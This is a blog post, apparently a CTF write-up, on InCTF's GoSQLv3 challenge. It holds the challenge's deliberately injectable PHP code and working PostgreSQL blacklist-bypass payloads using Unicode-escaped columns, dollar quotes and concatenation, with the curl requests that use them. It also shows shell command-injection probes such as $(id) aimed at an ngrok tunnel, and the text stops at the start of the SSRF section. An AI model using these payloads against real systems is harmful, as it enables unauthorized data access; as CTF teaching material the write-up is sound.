@@ -1,0 +1,786 @@
+<!DOCTYPE html><html lang="en"><head>
+    
+      <title>
+        Solving InCTF&#39;s GoSQLv3. ::
+        jorgectf — blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="description" content="Solving InCTF&amp;rsquo;s GoSQLv3 challenge."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://jorgectf.gitlab.io/blog/post/inctf-gosqlv3/"/>
+
+
+
+
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/assets/style.css"/>
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/style.css"/>
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jorgectf.gitlab.io/blog/img/apple-touch-icon-144-precomposed.png"/>
+<link rel="shortcut icon" href="https://jorgectf.gitlab.io/blog/img/favicon.png"/>
+
+
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Solving InCTF&#39;s GoSQLv3."/>
+<meta name="twitter:description" content="Solving InCTF’s GoSQLv3 challenge."/>
+
+
+
+<meta property="og:title" content="Solving InCTF&#39;s GoSQLv3."/>
+<meta property="og:description" content="Solving InCTF’s GoSQLv3 challenge."/>
+<meta property="og:type" content="article"/>
+<meta property="og:url" content="https://jorgectf.gitlab.io/blog/post/inctf-gosqlv3/"/><meta property="article:section" content="post"/>
+<meta property="article:published_time" content="2020-08-02T13:55:00+00:00"/>
+<meta property="article:modified_time" content="2020-08-02T13:55:00+00:00"/><meta property="og:site_name" content="jorgectf"/>
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+    
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+  </ul>
+</nav>
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Solving InCTF’s GoSQLv3.</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-08-02
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/ctf/">#CTF</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/sql-injection/">#SQL Injection</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/ssrf/">#SSRF</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/gopher/">#Gopher</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/mysql/">#MySQL</a> 
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <h1 id="tldr">TL;DR</h1>
+<p>In this post, I’ll be showing the path I took to solve GoSQLv3 challenge from <a href="https://twitter.com/teambi0s" target="_blank">teambi0s</a>&#39; <a href="https://ctftime.org/ctf/31" target="_blank">InCTF</a> that finished yesterday along with all the tricks and testing that didn’t work, because that’s as important as the actual solution since them can be valid in other situations.</p>
+<p>If you believe there’s anything wrong, please feel free to contact me via <a href="https://twitter.com/jorge_ctf" target="_blank">Twitter</a> or <a href="https://t.me/jorgectf" target="_blank">Telegram</a>. Let’s begin!</p>
+<h1 id="gosqlv3">GoSQLv3</h1>
+<p>This challenge was based on a PostgreSQL Injection conditioned by a (quite <em>nightmarish</em>) blacklist, followed by a SSRF allowing us to make Gopher requests to the former database engine.</p>
+<h2 id="sql-injection">SQL Injection</h2>
+<h4 id="challenge-code">Challenge Code</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">
+<span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;./config.php&#34;</span>);
+
+$db_connection <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>($host<span style="color:#f92672">.</span> $dbname <span style="color:#f92672">.</span>$user<span style="color:#f92672">.</span> $pass);
+<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$db_connection) {
+    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Connection failed&#34;</span>);
+}
+
+
+$name <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;name&#39;</span>];
+$column <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;column&#39;</span>];
+
+$blacklist  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;adm|min|\&#39;|substr|mid|concat|chr|ord|ascii|left|right|for| |from|where|having|trim|pos|&#34;</span>;
+$blacklist <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;insert|usern|ame|-|\/|go_to|or|and|#|\.|&gt;|&lt;|~|!|like|between|reg|rep|load|file|glob|cast|out|0b|\*|pg|con|%|to|&#34;</span>;
+$blacklist <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;rev|0x|limit|decode|conv|hex|in|from|\^|union|select|sleep|if|coalesce|max|proc|exp|group|rand|floor&#34;</span>;
+
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/</span><span style="color:#e6db74">$blacklist</span><span style="color:#e6db74">/i&#34;</span>, $name)){
+  <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Try Hard&#34;</span>);
+}
+
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/</span><span style="color:#e6db74">$blacklist</span><span style="color:#e6db74">/i&#34;</span>, $column)){
+  <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Try Hard&#34;</span>);
+}
+
+$query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select &#34;</span> <span style="color:#f92672">.</span> $column <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; from inctf2020 where username = &#34;</span> <span style="color:#f92672">.</span> $name ;
+
+$ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>($db_connection, $query);
+
+<span style="color:#66d9ef">if</span>($ret){
+<span style="color:#66d9ef">while</span>($row <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_fetch_array</span>($ret)){
+<span style="color:#66d9ef">if</span>($row[<span style="color:#e6db74">&#39;username&#39;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;admin&#34;</span>){
+      <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location:</span><span style="color:#e6db74">{</span>$row[<span style="color:#e6db74">&#39;go_to&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>);
+}
+  <span style="color:#66d9ef">else</span>{
+      <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;h4&gt;You are not admin &#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/h4&gt;&#34;</span>;
+  }
+
+}
+}<span style="color:#66d9ef">else</span>{
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;h4&gt;Having a query problem&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/h4&gt;&lt;br&gt;&#34;</span>;
+}
+
+<span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>As you can see, this <code>PHP</code> code is taking the <code>config.php</code> file to propperly connect to the database, requesting both <code>name and columns GET parameters</code>, <strong>sanitizing</strong> them with the <code>declared $blacklist</code>, and finally <strong>executing</strong> the query with those values. The key of this stage was to make the query return <code>$row[&#39;username&#39;] to equal &#34;admin&#34;</code>, then the page would send us to the next stage.</p>
+<p>Let’s start with the first variable in the query, <code>column</code>. To propperly test the queries I’ll be using the actual PostgreSQL database engine, but there are great alternatives like <a href="https://sqliteonline.com/" target="_blank">this</a>.</p>
+<h3 id="column">$column</h3>
+<p>As far as I know, there are just two ways to declare <strong>column names</strong> in a PostgreSQL query. 
+The first one is <em>globally</em> accepted (with <code>no surrounding quotes</code>) whereas the second one (surrounded by <code>double quotes</code>) only stands for PostgreSQL.</p>
+<p>No surrounding quotes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> testcolumn;
+ERROR:  <span style="color:#66d9ef">column</span> <span style="color:#e6db74">&#34;testcolumn&#34;</span> does <span style="color:#66d9ef">not</span> exist
+</code></pre></div><p>Surrounded by double quotes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#34;testcolumn&#34;</span>;
+ERROR:  <span style="color:#66d9ef">column</span> <span style="color:#e6db74">&#34;testcolumn&#34;</span> does <span style="color:#66d9ef">not</span> exist
+</code></pre></div><p>This detail is key, as we will be specifying the columns names to <code>UTF-16 encoding</code>.
+According to <a href="https://www.postgresql.org/docs/9.2/sql-syntax-lexical.html#SQL-SYNTAX-STRINGS-UESCAPE" target="_blank">PostgreSQL&amp;rsquo;s documentation</a>, the syntax is: (<a href="https://www.branah.com/unicode-converter" target="_blank">online website</a> to take the conversion from)</p>
+<pre tabindex="0"><code>test -&gt; \u0074\u0065\u0073\u0074 -&gt; U&amp;&#39;\0074\0065\0073\0074&#39;
+</code></pre><p>Let’s see if it is actually like that!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">U&amp;</span><span style="color:#e6db74">&#39;\0074\0065\0073\0074&#39;</span>;
+ <span style="color:#f92672">?</span><span style="color:#66d9ef">column</span><span style="color:#f92672">?</span>
+<span style="color:#75715e">----------
+</span><span style="color:#75715e"></span> test
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><p>So, if everything is okay, why is the engine returning a string and not specifying a column? That’s why the <code>double quotes</code> ‘thingy’ was key.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> U<span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0074</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0065</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0073</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0074</span>;
+invalid command <span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0074</span>
+
+testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">U&amp;</span><span style="color:#e6db74">&#39;\0074\0065\0073\0074&#39;</span>;
+ <span style="color:#f92672">?</span><span style="color:#66d9ef">column</span><span style="color:#f92672">?</span>
+<span style="color:#75715e">----------
+</span><span style="color:#75715e"></span> test
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+
+testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">U&amp;</span><span style="color:#e6db74">&#34;\0074\0065\0073\0074&#34;</span>;
+ERROR:  <span style="color:#66d9ef">column</span> <span style="color:#e6db74">&#34;test&#34;</span> does <span style="color:#66d9ef">not</span> exist
+</code></pre></div><p>This is the best summary to take into account that <strong>No surroundings &amp; Double Quotes (&#34;)</strong> stand for <strong>columns</strong> just after a SELECT statement, and <strong>Single Quotes (&#39;)</strong> always stand for <strong>strings</strong>.</p>
+<p>With that information, we can now build the <code>first part</code> of the query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">U&amp;</span><span style="color:#e6db74">&#34;\0075\0073\0065\0072\006e\0061\006d\0065&#34;</span>,<span style="color:#e6db74">U&amp;</span><span style="color:#e6db74">&#34;\0067\006f\005f\0074\006f&#34;</span>;
+ERROR:  <span style="color:#66d9ef">column</span> <span style="color:#e6db74">&#34;username&#34;</span> does <span style="color:#66d9ef">not</span> exist
+</code></pre></div><p>But this is not useful, as we won’t have enough information from PostgreSQL to propperly verify that our payload will success. Therefore, let’s create a simple table with such columns.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span> inctf2020 (id int, username text, go_to text);
+<span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span>
+</code></pre></div><p>And since we know an existing value in the database, it would be better to insert that value too.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> inctf2020 <span style="color:#66d9ef">VALUES</span> (<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;admin&#39;</span>, <span style="color:#e6db74">&#39;secret_place&#39;</span>);
+<span style="color:#66d9ef">INSERT</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">1</span>
+
+testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> inctf2020;
+ id <span style="color:#f92672">|</span> username <span style="color:#f92672">|</span>    go_to
+<span style="color:#75715e">----+----------+--------------
+</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">admin</span>    <span style="color:#f92672">|</span> secret_place
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><p>Now we are ready to resume our payload testing stage.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">U&amp;</span><span style="color:#e6db74">&#34;\0075\0073\0065\0072\006e\0061\006d\0065&#34;</span>,<span style="color:#e6db74">U&amp;</span><span style="color:#e6db74">&#34;\0067\006f\005f\0074\006f&#34;</span> <span style="color:#66d9ef">FROM</span> inctf2020;
+ username <span style="color:#f92672">|</span>    go_to
+<span style="color:#75715e">----------+--------------
+</span><span style="color:#75715e"></span> <span style="color:#66d9ef">admin</span>    <span style="color:#f92672">|</span> secret_place
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><p>There we go! We managed to SELECT everything from a column specifyed in UTF-16 encoding.</p>
+<p>Unfortunately, I came up quite fast with this part of the injection since it is one of the main Character Restriction Bypass techniques I studied before taking AWAE, so no extra tricks/tries here.</p>
+<h2 id="name">$name</h2>
+<p>This stage’s objective is to write ‘<strong>admin</strong>’, for the query to return the desired columns with such value.</p>
+<p>It would be as easy as writing ‘<strong>admin</strong>’, but that <em>nightmarish</em> blacklist appears again!</p>
+<pre tabindex="0"><code class="language-regexp" data-lang="regexp">$blacklist  = &#34;adm|min|\&#39;|...
+</code></pre><p>This is checking whether the string contains ‘<strong>adm</strong>’, ‘<strong>min</strong>’ and <strong>&#39;</strong>. Since we don’t have much options here, I usually refer to the <a href="https://www.postgresql.org/docs/9.1/functions-string.html" target="_blank">String Functions Documentation</a> and start searching for one that could help us building such string.</p>
+<h3 id="double-dollar-strings">Double Dollar Strings</h3>
+<p>Before searching the function, we need to find a way to declare a string without Single Quotes. It should be easy, ain’t it?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">U&amp;</span><span style="color:#e6db74">&#34;\0075\0073\0065\0072\006e\0061\006d\0065&#34;</span>,<span style="color:#e6db74">U&amp;</span><span style="color:#e6db74">&#34;\0067\006f\005f\0074\006f&#34;</span> <span style="color:#66d9ef">FROM</span> inctf2020 <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span>;
+ERROR:  <span style="color:#66d9ef">column</span> <span style="color:#e6db74">&#34;admin&#34;</span> does <span style="color:#66d9ef">not</span> exist
+
+testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">U&amp;</span><span style="color:#e6db74">&#34;\0075\0073\0065\0072\006e\0061\006d\0065&#34;</span>,<span style="color:#e6db74">U&amp;</span><span style="color:#e6db74">&#34;\0067\006f\005f\0074\006f&#34;</span> <span style="color:#66d9ef">FROM</span> inctf2020 <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#66d9ef">admin</span>;
+ERROR:  <span style="color:#66d9ef">column</span> <span style="color:#e6db74">&#34;admin&#34;</span> does <span style="color:#66d9ef">not</span> exist
+</code></pre></div><p>As we saw before, the only way to declare strings is by surrounding them by <code>Single Quotes</code>. So how are we going to declare it? Apparently, According to <a href="https://www.postgresql.org/docs/8.1/sql-syntax.html#4.1.2.2.%20Dollar-Quoted%20String%20Constants" target="_blank">Postgres documentation</a>, it allow us to surround a string with <code>two dollar signs ($)</code> in case we want it to me “<em>more readable</em>”.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;test&#39;</span>;
+ <span style="color:#f92672">?</span><span style="color:#66d9ef">column</span><span style="color:#f92672">?</span>
+<span style="color:#75715e">----------
+</span><span style="color:#75715e"></span> test
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+
+testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">$$test$$</span>;
+ <span style="color:#f92672">?</span><span style="color:#66d9ef">column</span><span style="color:#f92672">?</span>
+<span style="color:#75715e">----------
+</span><span style="color:#75715e"></span> test
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><p>Therefore, we are now ready to find a function to concatenate the string ‘<em>admin</em>’.</p>
+<h3 id="lpad-function">LPAD Function</h3>
+<p>This function allow us to literally <strong>“Fill up the <em>string</em> to length <em>length</em> by prepending the characters <em>fill</em> (a space by default). If the <em>string</em> is already longer than <em>length</em> then it is truncated (on the right).&#34;</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> LPAD(<span style="color:#e6db74">&#39;world&#39;</span>, <span style="color:#ae81ff">10</span>, <span style="color:#e6db74">&#39;hello&#39;</span>);
+    lpad
+<span style="color:#75715e">------------
+</span><span style="color:#75715e"></span> helloworld
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><p>This is everything we need to concatenate every ‘<strong>admin</strong>’ letter. (It is not strictly needed to concatenate each character, but it is better to practice in case we could need it again)</p>
+<p>This is what we end up getting:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> LPAD(<span style="color:#e6db74">&#39;n&#39;</span>, <span style="color:#ae81ff">5</span>, LPAD(<span style="color:#e6db74">&#39;i&#39;</span>, <span style="color:#ae81ff">4</span>, LPAD(<span style="color:#e6db74">&#39;m&#39;</span>, <span style="color:#ae81ff">3</span>, LPAD(<span style="color:#e6db74">&#39;d&#39;</span>, <span style="color:#ae81ff">2</span>, LPAD(<span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;&#39;</span>)))));
+ lpad
+<span style="color:#75715e">-------
+</span><span style="color:#75715e"></span> <span style="color:#66d9ef">admin</span>
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><p>There we go! Now the query will return what we want it to.</p>
+<h3 id="____-string-concatenation">‘<strong>||</strong>’ String Concatenation</h3>
+<p>However, isn’t there another (and easier) way to concatenate strings in Postgres? Yes, <a href="https://stackoverflow.com/questions/35797709/why-is-used-as-string-concatenation-in-postgresql-redshift" target="_blank">there is</a>, but I remembered of it later on. However, we will be using the former technique again.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#960050;background-color:#1e0010">$</span> python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;print(&#34;||&#34;.join(&#34;$$&#34;+i+&#34;$$&#34; for i in &#34;admin&#34;))&#39;</span>
+
+<span style="color:#960050;background-color:#1e0010">$$</span>a<span style="color:#960050;background-color:#1e0010">$$</span><span style="color:#f92672">||</span><span style="color:#960050;background-color:#1e0010">$$</span>d<span style="color:#960050;background-color:#1e0010">$$</span><span style="color:#f92672">||</span><span style="color:#960050;background-color:#1e0010">$$</span>m<span style="color:#960050;background-color:#1e0010">$$</span><span style="color:#f92672">||</span><span style="color:#960050;background-color:#1e0010">$$</span>i<span style="color:#960050;background-color:#1e0010">$$</span><span style="color:#f92672">||</span><span style="color:#960050;background-color:#1e0010">$$</span>n<span style="color:#960050;background-color:#1e0010">$$</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">$$a$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$d$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$m$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$i$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$n$$</span>;
+ <span style="color:#f92672">?</span><span style="color:#66d9ef">column</span><span style="color:#f92672">?</span>
+<span style="color:#75715e">----------
+</span><span style="color:#75715e"></span> <span style="color:#66d9ef">admin</span>
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><h3 id="getting-the-secret-location">Getting the secret location</h3>
+<p>Let’s submit the query to get the location of the next stage.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl -I <span style="color:#e6db74">&#39;http://MIRROR/?column=U&amp;&#34;\0075\0073\0065\0072\006e\0061\006d\0065&#34;,U&amp;&#34;\0067\006f\005f\0074\006f&#34;&amp;name=$$a$$||$$d$$||$$m$$||$$i$$||$$n$$&#39;</span>
+
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Date: Sun, <span style="color:#ae81ff">02</span> Aug <span style="color:#ae81ff">2020</span> 18:11:43 GMT
+Server: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+</code></pre></div><p>Hmm, it seems we are missing something… or actually not. The backend is taking more than two <code>$_GET</code> arguments, as &amp;s are not URL Encoded and stand for the declaration of a new GET parameter.</p>
+<p><code>&amp; -&gt; (URL ENCODE) -&gt; %26</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl -I <span style="color:#e6db74">&#39;http://MIRROR/?column=U%26&#34;\0075\0073\0065\0072\006e\0061\006d\0065&#34;,U%26&#34;\0067\006f\005f\0074\006f&#34;&amp;name=$$a$$||$$d$$||$$m$$||$$i$$||$$n$$&#39;</span>
+
+HTTP/1.1 <span style="color:#ae81ff">302</span> Found
+Date: Sun, <span style="color:#ae81ff">02</span> Aug <span style="color:#ae81ff">2020</span> 18:14:03 GMT
+Server: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Location: ./feel_the_gosql_series.php
+Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+</code></pre></div><p>There we go! The Location we must follow is at <code>feel_the_gosql_series.php</code>.</p>
+<h2 id="ssrf-approach">SSRF approach</h2>
+<p><img src="https://jorgectf.gitlab.io/blog/static/inctf2020/ssrf.png" alt=""/></p>
+<p>We are facing an input whose content will be executed along with cURL. Before enumerating which protocols the input allows, let’s see if anything can be injected.</p>
+<h3 id="code-injection-fail">Code Injection (Fail)</h3>
+<p>If the backend is not using <a href="https://www.php.net/manual/en/function.escapeshellarg.php" target="_blank">escapeshellarg()</a> function, we could inject code by escaping the provided quotes or just executing <code>$(command here)</code>. To propperly test this, a public and reachable IP address is needed, however, there’s a tool called <a href="https://ngrok.com/" target="_blank">ngrok</a> that allow us to <em>open</em> our localhost to a domain controlled by them. There’s a more detailed post about how it works <a href="https://0xdf.gitlab.io/2020/05/12/ngrok-ftw.html" target="_blank">here</a>.</p>
+<p>We could try something like:</p>
+<pre tabindex="0"><code>NGROK-TUNNEL/$(id)
+NGROK-TUNNEL/&#39;$(id)
+NGROK-TUNNEL/&#34;$(id)
+NGROK-TUNNEL/&#34;&#39;$(id)
+</code></pre><p>But will never work, as it is actually using that function. (function <a href="http://micmap.org/php-by-example/en/function/escapeshellarg" target="_blank">in-action</a>)</p>
+<h3 id="enumerating-allowed-protocols">Enumerating allowed protocols</h3>
+<p>According to <a href="https://www.mit.edu/afs.new/sipb/user/ssen/src/curl-7.11.1/docs/curl.html" target="_blank">curl&amp;rsquo;s man page</a>, its supported protocols are <code>HTTP, HTTPS, FTP, FTPS, GOPHER, DICT, TELNET, LDAP or FILE</code>, so let’s see which of them are actually allowed.</p>
+<h4 id="finding-a-boolean-way-of-enumerating-them">Finding a <em>Boolean</em> way of enumerating them</h4>
